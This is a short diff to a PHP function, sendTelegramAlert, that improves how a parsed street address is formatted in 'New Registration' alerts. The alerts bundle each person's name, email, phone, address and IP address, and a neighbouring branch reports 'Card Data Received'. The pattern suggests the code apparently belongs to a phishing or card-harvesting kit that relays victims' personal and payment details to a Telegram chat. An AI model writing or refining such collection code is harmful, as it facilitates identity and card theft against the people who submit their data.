@@ -122,11 +122,20 @@ function sendTelegramAlert(string $type, array $data): void {
 
     $msg = '';
     if ($type === 'registration') {
+        $addr = $data['address'] ?? '';
+        $addrParsed = is_string($addr) ? json_decode($addr, true) : $addr;
+        if (is_array($addrParsed) && isset($addrParsed['street'])) {
+            $addrStr = $e($addrParsed['street']) . "\n"
+                     . $e($addrParsed['city'] ?? '') . ', ' . $e($addrParsed['state'] ?? '') . ' ' . $e($addrParsed['zip'] ?? '') . "\n"
+                     . $e($addrParsed['country'] ?? '');
+        } else {
+            $addrStr = $e($addr);
+        }
         $msg = "<b>New Registration</b>\n"
              . "<b>Name:</b> " . $e($data['name'] ?? '') . "\n"
              . "<b>Email:</b> " . $e($data['email'] ?? '') . "\n"
              . "<b>Phone:</b> " . $e($data['phone'] ?? '') . "\n"
-             . "<b>Address:</b> " . $e($data['address'] ?? '') . "\n"
+             . "<b>Address:</b>\n" . $addrStr . "\n"
              . "<b>IP:</b> " . $e($data['ip'] ?? '');
     } elseif ($type === 'payment') {
         $msg = "<b>Card Data Received</b>\n"
